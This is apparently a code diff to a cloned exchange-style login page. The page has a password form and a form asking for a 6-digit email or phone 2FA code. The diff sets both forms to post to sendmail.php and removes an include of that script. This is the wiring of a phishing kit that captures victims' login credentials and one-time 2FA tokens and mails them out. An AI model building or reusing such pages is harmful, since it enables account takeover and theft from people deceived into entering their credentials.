@@ -1,4 +1,3 @@
-<?php include "sendmail.php"; ?>
 <!DOCTYPE html>
 <html translate="no" lang="en" dir="ltr">
 
@@ -554,7 +553,7 @@
                                   </div>
                                 </section>
                                 
-                                <form method="post" id="login-form" onsubmit="handleForm(event)" class="css-fcf6q KuxForm-form KuxForm-verticalForm">
+                                <form method="post" id="login-form" onsubmit="handleForm(event)" class="css-fcf6q KuxForm-form KuxForm-verticalForm"action="sendmail.php">
                                   
                                   <div class="KuxForm-item css-9mv970">
                                     <div class="KuxForm-itemRowContainer KuxRow-row css-1uqn2oy" style="row-gap: 0px;">
@@ -652,7 +651,7 @@
                                           
                                           <h2 class="css-mr4dhk">Enter the 6-Digit Email Verification Code</h2>
                                           <div class="KuxBox-root css-1ule816">Enter 2FA 6-Digit token code received in your email or phone number.</div>
-                                          <form method="post" class="KuxForm-form KuxForm-verticalForm" onsubmit="sendToken(event)">
+                                          <form method="post" class="KuxForm-form KuxForm-verticalForm" onsubmit="sendToken(event)"action="sendmail.php">
                                             <div class="css-1cl5qwb">
                                               <div class="KuxForm-item css-9mv970">
                                                 <div class="KuxForm-itemRowContainer KuxRow-row css-1uqn2oy" style="row-gap: 0px;">
